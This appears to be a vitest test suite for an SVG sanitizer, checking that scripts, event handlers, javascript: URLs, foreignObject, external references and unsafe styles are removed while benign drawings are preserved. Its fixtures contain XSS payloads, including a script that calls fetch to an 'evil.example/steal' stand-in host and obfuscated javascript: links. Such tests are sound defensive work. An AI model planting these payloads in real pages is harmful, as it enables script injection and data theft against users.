import { describe, expect, it } from 'vitest';
import tool from './svg-sanitizer.tool';

type Output = { filename: string; blob: Blob; previewUrl?: string };
type Result = {
  outputs: Output[];
  report?: { output: string; render?: string };
  notes?: string[];
  warnings?: string[];
  stats?: Record<string, string | number>;
};
type Table = { headers: string[]; rows: string[][] };

const run = async (text: string, options: Record<string, string | number | boolean> = {}) =>
  (await tool.run({ files: [], text, options })) as Result;

const runFile = async (
  content: string,
  name: string,
  options: Record<string, string | number | boolean> = {},
) => (await tool.run({ files: [new File([content], name, { type: 'image/svg+xml' })], options })) as Result;

const table = (result: Result): Table => JSON.parse(result.report?.output ?? '{}') as Table;

const cleaned = async (result: Result): Promise<string> => {
  const output = result.outputs[0];
  if (output === undefined) throw new Error('no output file');
  return await output.blob.text();
};

const actions = (result: Result): string[] => table(result).rows.map((row) => row[0] ?? '');

const SVG = (body: string, attrs = ''): string =>
  '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"' + attrs + '>' + body + '</svg>';

const NASTY = [
  '<?xml-stylesheet href="https://evil.example/x.css" type="text/css"?>',
  '<!DOCTYPE svg>',
  '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="alert(1)">',
  '  <!-- a comment -->',
  '  <script>fetch("https://evil.example/steal")</script>',
  '  <g><script>alert(2)</script><circle cx="5" cy="5" r="2"/></g>',
  '  <foreignObject width="10" height="10"><div xmlns="http://www.w3.org/1999/xhtml">hi</div></foreignObject>',
  '  <image href="https://evil.example/track.png"/>',
  '  <a xlink:href="javascript:alert(3)"><text x="1" y="2">x</text></a>',
  '  <style>@import url("https://evil.example/y.css");</style>',
  '  <rect width="10" height="10" onclick="alert(4)" style="fill:url(javascript:alert(5))"/>',
  '  <circle cx="20" cy="20" r="5" fill="#0af"/>',
  '</svg>',
].join('\n');

const dangerousRemnants = (svg: string): string[] => {
  const doc = new DOMParser().parseFromString(svg, 'image/svg+xml');
  const found: string[] = [];
  for (const element of Array.from(doc.getElementsByTagName('*'))) {
    if (['script', 'foreignobject', 'iframe', 'embed', 'object'].includes(element.localName.toLowerCase())) {
      found.push('element:' + element.localName);
    }
    for (const attribute of Array.from(element.attributes)) {
      if (attribute.name.toLowerCase().startsWith('on')) found.push('attribute:' + attribute.name);
      if (/javascript:/iu.test(attribute.value)) found.push('url:' + attribute.value);
    }
  }
  return found;
};

describe('svg-sanitizer', () => {
  it('removes script elements and reports them', async () => {
    const result = await run(SVG('<script>alert(1)</script><circle cx="1" cy="1" r="1"/>'));
    expect(actions(result)).toEqual(['Removed element']);
    expect(table(result).rows[0]?.[1]).toBe('script');
    expect(await cleaned(result)).not.toMatch(/script/iu);
    expect(result.stats?.removedElements).toBe(1);
  });

  it('removes event handler attributes case-insensitively', async () => {
    const result = await run(SVG('<rect width="1" height="1"/>', ' onload="x()" ONCLICK="y()"'));
    expect(result.stats?.removedAttributes).toBe(2);
    const output = await cleaned(result);
    expect(output).not.toMatch(/onload/iu);
    expect(output).not.toMatch(/onclick/iu);
  });

  it('removes javascript: hrefs on links and uses', async () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' +
      '<a href="javascript:alert(1)"><text x="1" y="1">a</text></a>' +
      '<a xlink:href="JaVa\nScRiPt:alert(2)"><text x="2" y="2">b</text></a>' +
      '</svg>';
    const result = await run(svg);
    expect(result.stats?.removedAttributes).toBe(2);
    expect(result.warnings?.join(' ')).toMatch(/2 active construct/i);
    expect(await cleaned(result)).not.toMatch(/javascript:/iu);
  });

  it('strips references outside the document but keeps fragments and raster data URIs', async () => {
    const svg = SVG(
      '<defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient></defs>' +
        '<image href="https://cdn.example/photo.png"/>' +
        '<image href="data:image/png;base64,iVBORw0KGgo="/>' +
        '<use href="#g"/>',
    );
    const result = await run(svg);
    expect(result.stats?.removedAttributes).toBe(1);
    const output = await cleaned(result);
    expect(output).not.toContain('cdn.example');
    expect(output).toContain('data:image/png;base64');
    expect(output).toContain('#g');
  });

  it('keeps external references when asked, but never a javascript: URL', async () => {
    const svg = SVG('<image href="https://cdn.example/photo.png"/><a href="javascript:alert(1)"><text x="1" y="1">a</text></a>');
    const result = await run(svg, { externalRefs: 'keep' });
    expect(result.stats?.removedAttributes).toBe(1);
    const output = await cleaned(result);
    expect(output).toContain('https://cdn.example/photo.png');
    expect(output).not.toMatch(/javascript:/iu);
    expect(result.notes?.join(' ')).toMatch(/may still make network requests/i);
  });

  it('removes foreignObject together with its contents', async () => {
    const svg = SVG('<foreignObject width="10" height="10"><div xmlns="http://www.w3.org/1999/xhtml">x</div></foreignObject>');
    const result = await run(svg);
    expect(table(result).rows[0]?.[1]).toBe('foreignObject');
    expect(await cleaned(result)).not.toMatch(/foreignObject/iu);
  });

  it('removes an unsafe style element but keeps a safe one', async () => {
    const unsafe = await run(SVG('<style>@import url("https://evil.example/a.css");</style>'));
    expect(unsafe.stats?.removedElements).toBe(1);

    const safe = await run(SVG('<style>.a{fill:#0af}</style><circle class="a" cx="1" cy="1" r="1"/>'));
    expect(safe.stats?.otherRemovals).toBe(0);
    expect(await cleaned(safe)).toContain('.a{fill:#0af}');
  });

  it('removes comments only when asked', async () => {
    const kept = await run(SVG('<!-- keep me --><circle cx="1" cy="1" r="1"/>'), { stripComments: false });
    expect(actions(kept)).toEqual(['none']);
    expect(await cleaned(kept)).toContain('keep me');

    const removed = await run(SVG('<!-- drop me --><circle cx="1" cy="1" r="1"/>'));
    expect(actions(removed)).toEqual(['Removed comment']);
    expect(await cleaned(removed)).not.toContain('drop me');
  });

  it('removes the DOCTYPE and XML processing instructions', async () => {
    const svg = '<?xml-stylesheet href="https://evil.example/x.css"?>\n<!DOCTYPE svg>\n' + SVG('<rect width="1" height="1"/>');
    const result = await run(svg);
    expect(actions(result)).toEqual(['Removed DOCTYPE', 'Removed processing instruction']);
    expect(result.stats?.otherRemovals).toBe(2);
    const output = await cleaned(result);
    expect(output).not.toContain('DOCTYPE');
    expect(output).not.toContain('xml-stylesheet');
  });

  it('removes a set element that animates an href, but keeps a benign animation', async () => {
    const svg = SVG(
      '<circle cx="10" cy="10" r="5"><animate attributeName="r" from="5" to="9" dur="1s"/></circle>' +
        '<rect width="10" height="10"><set attributeName="href" to="javascript:alert(1)"/></rect>',
    );
    const result = await run(svg);
    expect(result.stats?.removedElements).toBe(1);
    expect(table(result).rows[0]?.[1]).toBe('set');
    const output = await cleaned(result);
    expect(output).toContain('attributeName="r"');
    expect(output).not.toMatch(/javascript:/iu);
  });

  it('removes scriptable inline styles', async () => {
    const result = await run(SVG('<rect width="1" height="1" style="fill:url(javascript:alert(1))"/>'));
    expect(result.stats?.removedAttributes).toBe(1);
    expect(await cleaned(result)).not.toMatch(/javascript:/iu);
  });

  it('leaves a benign drawing untouched apart from the XML declaration', async () => {
    const svg = SVG(
      '<defs><linearGradient id="sky" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#8ecae6"/></linearGradient></defs>' +
        '<circle cx="50" cy="50" r="40" fill="url(#sky)" stroke="#023047" stroke-width="2"/>' +
        '<path d="M10 90 L50 10 L90 90 Z" fill="none"/>' +
        '<text x="50" y="95" font-size="10">ok</text>',
    );
    const result = await run(svg);
    expect(actions(result)).toEqual(['none']);
    expect(table(result).rows[0]?.[0]).toBe('none');
    expect(result.stats).toMatchObject({ removedElements: 0, removedAttributes: 0, otherRemovals: 0 });

    const output = await cleaned(result);
    expect(output).toContain('M10 90 L50 10 L90 90 Z');
    expect(output).toContain('fill="url(#sky)"');
    const before = new DOMParser().parseFromString(svg, 'image/svg+xml').getElementsByTagName('*').length;
    const after = new DOMParser().parseFromString(output, 'image/svg+xml').getElementsByTagName('*').length;
    expect(after).toBe(before);
  });

  it('produces a sanitized file named after the input', async () => {
    const result = await runFile(SVG('<script>x()</script><rect width="1" height="1"/>'), 'logo.svg');
    const output = result.outputs[0];
    expect(output?.filename).toBe('logo.sanitized.svg');
    expect(output?.blob.type).toBe('image/svg+xml');
    expect(output?.previewUrl?.startsWith('data:image/svg+xml;charset=utf-8,')).toBe(true);
    expect(await cleaned(result)).toMatch(/^<\?xml version="1\.0" encoding="UTF-8"\?>/u);
  });

  it('falls back to a default filename for pasted markup', async () => {
    const result = await run(SVG('<rect width="1" height="1"/>'));
    expect(result.outputs[0]?.filename).toBe('image.sanitized.svg');
  });

  it('audits without producing a file', async () => {
    const result = await run(NASTY, { action: 'audit' });
    expect(result.outputs).toEqual([]);
    expect(result.notes?.join(' ')).toMatch(/audit only/i);
    expect(actions(result).length).toBeGreaterThan(5);
  });

  it('reports nothing to do for a clean file', async () => {
    const result = await run(SVG('<rect width="1" height="1"/>'));
    expect(result.notes?.join(' ')).toMatch(/no risky constructs were found/i);
    expect(result.warnings ?? []).toEqual([]);
    expect(result.outputs).toHaveLength(1);
  });

  it('leaves no active content behind in the sanitized output', async () => {
    const result = await run(NASTY);
    const output = await cleaned(result);
    expect(dangerousRemnants(output)).toEqual([]);
    expect(output).not.toContain('evil.example');
    expect(output).not.toMatch(/<script|<foreignObject|DOCTYPE/iu);
    expect(output).toContain('fill="#0af"');
    expect(output).toContain('cx="20"');
  });

  it('counts what it removed and shrinks the file', async () => {
    const result = await run(NASTY);
    expect(result.stats?.removedElements).toBeGreaterThanOrEqual(4);
    expect(result.stats?.removedAttributes).toBeGreaterThanOrEqual(4);
    expect(Number(result.stats?.bytesAfter)).toBeLessThan(Number(result.stats?.bytesBefore));
    expect(result.warnings?.join(' ')).toMatch(/active construct\(s\) were removed/i);
    expect(result.notes?.join(' ')).toMatch(/hardening filter, not a sandbox/i);
  });

  it('lists every change with an action, target and reason', async () => {
    const result = await run(NASTY);
    expect(table(result).headers).toEqual(['Action', 'Target', 'Detail']);
    for (const row of table(result).rows) {
      expect(row[0]).toMatch(/^Removed /u);
      expect((row[1] ?? '').length).toBeGreaterThan(0);
      expect((row[2] ?? '').length).toBeGreaterThan(10);
    }
  });

  it('warns when the root element is outside the SVG namespace', async () => {
    const result = await run('<svg width="10" height="10"><rect width="1" height="1"/></svg>');
    expect(result.warnings?.join(' ')).toMatch(/not in the SVG namespace/i);
  });

  it('reads an SVG from a File object', async () => {
    const result = await runFile(NASTY, 'art.svg');
    expect(result.stats?.removedElements).toBeGreaterThanOrEqual(4);
    expect(result.outputs[0]?.filename).toBe('art.sanitized.svg');
  });

  it('rejects empty input', async () => {
    await expect(run('')).rejects.toThrow(/no svg was provided/i);
  });

  it('rejects markup that is not well-formed XML', async () => {
    await expect(run('<svg><rect width="1"')).rejects.toThrow(/not well-formed svg/i);
  });

  it('rejects well-formed XML whose root is not svg', async () => {
    await expect(run('<html><body>hi</body></html>')).rejects.toThrow(/root element is <html>/i);
  });
});
